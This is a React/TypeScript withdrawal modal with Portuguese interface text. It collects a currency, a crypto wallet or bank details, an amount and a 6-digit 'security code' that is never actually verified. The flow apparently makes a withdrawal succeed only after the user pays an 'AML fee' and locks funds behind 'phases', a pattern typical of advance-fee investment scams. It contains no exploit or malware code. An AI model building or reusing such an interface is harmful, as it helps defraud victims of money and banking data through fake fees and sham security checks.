'use client';

import { useState } from 'react';
import { X, Wallet, Banknote, ArrowRight, Shield, AlertCircle } from 'lucide-react';
import AMLModal from './AMLModal';
import styles from '@/styles/WithdrawalModal.module.css';

interface WithdrawalModalProps {
  isOpen: boolean;
  onClose: () => void;
  phase: number;
  amount: number;
  isAvailable: boolean;
}

export default function WithdrawalModal({ isOpen, onClose, phase, amount, isAvailable }: WithdrawalModalProps) {
  const [step, setStep] = useState(1);
  const [currency, setCurrency] = useState('USD');
  const [withdrawalMethod, setWithdrawalMethod] = useState('');
  const [network, setNetwork] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [fee, setFee] = useState(0);
  const [bankDetails, setBankDetails] = useState({
    accountName: '',
    bankName: '',
    accountNumber: '',
    iban: '',
    swift: '',
    currency: 'USD',
    reference: ''
  });
  const [walletAddress, setWalletAddress] = useState('');
  const [securityCode, setSecurityCode] = useState('');
  const [showSecurity, setShowSecurity] = useState(false);
  const [showAML, setShowAML] = useState(false);
  const [amlCompleted, setAmlCompleted] = useState(false);

  if (!isOpen) return null;

  const calculateFee = (amount: number) => {
    if (withdrawalMethod === 'crypto') return amount * 0.01; // 1% para cripto
    if (withdrawalMethod === 'bank') return 25; // Taxa fixa para banco
    return amount * 0.005; // 0.5% para outros métodos
  };

  const handleAmountChange = (value: string) => {
    setWithdrawalAmount(value);
    const numValue = parseFloat(value) || 0;
    setFee(calculateFee(numValue));
  };

  const getNetAmount = () => {
    const numValue = parseFloat(withdrawalAmount) || 0;
    return Math.max(0, numValue - fee);
  };

  const handleNextStep = () => {
    if (step < 4) {
      setStep(step + 1);
    } else {
      setShowSecurity(true);
    }
  };

  const handleBackStep = () => {
    if (step > 1) {
      setStep(step - 1);
    }
  };

  const handleSubmit = () => {
    // Após completed, mostrar modal AML
    setShowAML(true);
  };

  const handleAMLConfirm = () => {
    setAmlCompleted(true);
    setShowAML(false);
    alert('Levantamento processado com sucesso após pagamento AML!');
    onClose();
  };

  const handleAMLReject = () => {
    alert('Transação bloqueada devido à falta de pagamento de taxas AML.');
    onClose();
  };

  const finalAmount = parseFloat(withdrawalAmount) || 0;

  const renderStep1 = () => (
    <div className={styles.stepContent}>
      <h3 className={styles.stepTitle}>Selecione a Moeda</h3>
      <div className={styles.currencyGrid}>
        {['USD', 'EUR', 'USDT', 'BTC', 'ETH'].map((curr) => (
          <button
            key={curr}
            className={`${styles.currencyOption} ${currency === curr ? styles.selected : ''}`}
            onClick={() => setCurrency(curr)}
          >
            <span className={styles.currencySymbol}>{curr}</span>
            <span className={styles.currencyName}>
              {curr === 'USD' ? 'Dólar Americano' :
               curr === 'EUR' ? 'Euro' :
               curr === 'USDT' ? 'Tether' :
               curr === 'BTC' ? 'Bitcoin' : 'Ethereum'}
            </span>
          </button>
        ))}
      </div>
    </div>
  );

  const renderStep2 = () => (
    <div className={styles.stepContent}>
      <h3 className={styles.stepTitle}>Método de Retirada</h3>
      <div className={styles.methodGrid}>
        <button
          className={`${styles.methodOption} ${withdrawalMethod === 'crypto' ? styles.selected : ''}`}
          onClick={() => setWithdrawalMethod('crypto')}
        >
          <Wallet className={styles.methodIcon} />
          <div>
            <span className={styles.methodTitle}>Carteira Cripto</span>
            <span className={styles.methodDescription}>Transferência para carteira digital</span>
          </div>
        </button>
        <button
          className={`${styles.methodOption} ${withdrawalMethod === 'bank' ? styles.selected : ''}`}
          onClick={() => setWithdrawalMethod('bank')}
        >
          <Banknote className={styles.methodIcon} />
          <div>
            <span className={styles.methodTitle}>Transferência Bancária</span>
            <span className={styles.methodDescription}>Transferência para conta bancária</span>
          </div>
        </button>
        <button
          className={`${styles.methodOption} ${withdrawalMethod === 'other' ? styles.selected : ''}`}
          onClick={() => setWithdrawalMethod('other')}
        >
          <ArrowRight className={styles.methodIcon} />
          <div>
            <span className={styles.methodTitle}>Outros Métodos</span>
            <span className={styles.methodDescription}>Métodos alternativos disponíveis</span>
          </div>
        </button>
      </div>
    </div>
  );

  const renderStep3 = () => (
    <div className={styles.stepContent}>
      <h3 className={styles.stepTitle}>
        {withdrawalMethod === 'crypto' ? 'Detalhes da Carteira' : 'Dados Bancários'}
      </h3>
      
      {withdrawalMethod === 'crypto' ? (
        <div className={styles.formGroup}>
          <label className={styles.formLabel}>Endereço da Carteira</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="0x1234...5678"
            value={walletAddress}
            onChange={(e) => setWalletAddress(e.target.value)}
          />
          
          <label className={styles.formLabel}>Rede</label>
          <div className={styles.networkGrid}>
            {['TRC20', 'ERC20', 'BEP20', 'BTC'].map((net) => (
              <button
                key={net}
                className={`${styles.networkOption} ${network === net ? styles.selected : ''}`}
                onClick={() => setNetwork(net)}
              >
                {net}
              </button>
            ))}
          </div>
        </div>
      ) : (
        <div className={styles.formGroup}>
          <label className={styles.formLabel}>Nome do Titular</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="Nome completo do titular"
            value={bankDetails.accountName}
            onChange={(e) => setBankDetails({...bankDetails, accountName: e.target.value})}
          />
          
          <label className={styles.formLabel}>Nome do Banco</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="Nome do banco"
            value={bankDetails.bankName}
            onChange={(e) => setBankDetails({...bankDetails, bankName: e.target.value})}
          />
          
          <label className={styles.formLabel}>Número da Conta</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="Número da conta bancária"
            value={bankDetails.accountNumber}
            onChange={(e) => setBankDetails({...bankDetails, accountNumber: e.target.value})}
          />
          
          <label className={styles.formLabel}>IBAN</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="IBAN (quando aplicável)"
            value={bankDetails.iban}
            onChange={(e) => setBankDetails({...bankDetails, iban: e.target.value})}
          />
          
          <label className={styles.formLabel}>SWIFT/BIC</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="Código SWIFT/BIC"
            value={bankDetails.swift}
            onChange={(e) => setBankDetails({...bankDetails, swift: e.target.value})}
          />
          
          <label className={styles.formLabel}>Referência (opcional)</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="Finalidade ou referência"
            value={bankDetails.reference}
            onChange={(e) => setBankDetails({...bankDetails, reference: e.target.value})}
          />
        </div>
      )}
    </div>
  );

  const renderStep4 = () => (
    <div className={styles.stepContent}>
      <h3 className={styles.stepTitle}>Montante a Retirar</h3>
      
      <div className={styles.amountSection}>
        <div className={styles.availableBalance}>
          <span className={styles.balanceLabel}>Disponível:</span>
          <span className={styles.balanceValue}>
            {currency} {amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </span>
        </div>
        
        <label className={styles.formLabel}>Montante a Retirar</label>
        <div className={styles.amountInput}>
          <input
            type="number"
            className={styles.formInput}
            placeholder="0.00"
            value={withdrawalAmount}
            onChange={(e) => handleAmountChange(e.target.value)}
            max={amount}
          />
          <span className={styles.currencyBadge}>{currency}</span>
        </div>
        
        <div className={styles.feeSection}>
          <div className={styles.feeRow}>
            <span className={styles.feeLabel}>Taxa de levantamento:</span>
            <span className={styles.feeValue}>
              {currency} {fee.toFixed(2)}
            </span>
          </div>
          <div className={styles.feeRow}>
            <span className={styles.feeLabel}>Montante líquido a receber:</span>
            <span className={styles.netAmount}>
              {currency} {getNetAmount().toFixed(2)}
            </span>
          </div>
        </div>
      </div>
      
      {!isAvailable && (
        <div className={styles.warningBox}>
          <AlertCircle className={styles.warningIcon} />
          <span className={styles.warningText}>
            Esta fase está bloqueada. Complete as fases anteriores para desbloquear.
          </span>
        </div>
      )}
    </div>
  );

  const renderSecurityStep = () => (
    <div className={styles.stepContent}>
      <div className={styles.securityHeader}>
        <Shield className={styles.securityIcon} />
        <h3 className={styles.stepTitle}>Verificação de Segurança</h3>
      </div>
      
      <p className={styles.securityDescription}>
        Insira o código de verificação enviado para o seu email e/ou SMS para confirmar esta transação.
      </p>
      
      <div className={styles.formGroup}>
        <label className={styles.formLabel}>Código de Verificação</label>
        <input
          type="text"
          className={styles.formInput}
          placeholder="Digite o código de 6 dígitos"
          value={securityCode}
          onChange={(e) => setSecurityCode(e.target.value)}
          maxLength={6}
        />
      </div>
      
      <div className={styles.securityOptions}>
        <button className={styles.securityOptionBtn}>
          Reenviar por Email
        </button>
        <button className={styles.securityOptionBtn}>
          Reenviar por SMS
        </button>
      </div>
    </div>
  );

  return (
    <div className={styles.modalOverlay} onClick={onClose}>
      <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
        <div className={styles.modalHeader}>
          <div>
            <h2 className={styles.modalTitle}>
              Levantamento - {phase}ª Fase
            </h2>
            <p className={styles.modalSubtitle}>
              {isAvailable ? 'Disponível para levantamento' : 'Bloqueado'}
            </p>
          </div>
          <button className={styles.closeButton} onClick={onClose}>
            <X size={24} />
          </button>
        </div>

        <div className={styles.progressBar}>
          <div 
            className={styles.progressFill} 
            style={{ width: `${(step / 4) * 100}%` }}
          />
        </div>

        <div className={styles.stepIndicator}>
          <span className={styles.stepText}>Passo {step} de 4</span>
        </div>

        <div className={styles.modalBody}>
          {showSecurity ? renderSecurityStep() : (
            <>
              {step === 1 && renderStep1()}
              {step === 2 && renderStep2()}
              {step === 3 && renderStep3()}
              {step === 4 && renderStep4()}
            </>
          )}
        </div>

        <div className={styles.modalFooter}>
          {!showSecurity ? (
            <>
              {step > 1 && (
                <button className={styles.backButton} onClick={handleBackStep}>
                  Voltar
                </button>
              )}
              <button 
                className={styles.nextButton}
                onClick={handleNextStep}
                disabled={
                  (step === 1 && !currency) ||
                  (step === 2 && !withdrawalMethod) ||
                  (step === 3 && withdrawalMethod === 'crypto' && (!walletAddress || !network)) ||
                  (step === 3 && withdrawalMethod === 'bank' && !bankDetails.accountName) ||
                  (step === 4 && (!withdrawalAmount || parseFloat(withdrawalAmount) <= 0))
                }
              >
                {step === 4 ? 'Confirmar' : 'Próximo'}
              </button>
            </>
          ) : (
            <>
              <button className={styles.backButton} onClick={() => setShowSecurity(false)}>
                Voltar
              </button>
              <button 
                className={styles.submitButton}
                onClick={handleSubmit}
                disabled={securityCode.length !== 6}
              >
                Confirmar Levantamento
              </button>
            </>
          )}
        </div>
      </div>

      <AMLModal
        isOpen={showAML}
        onClose={() => setShowAML(false)}
        onConfirm={handleAMLConfirm}
        onReject={handleAMLReject}
        transactionAmount={finalAmount}
        currency={currency}
      />
    </div>
  );
}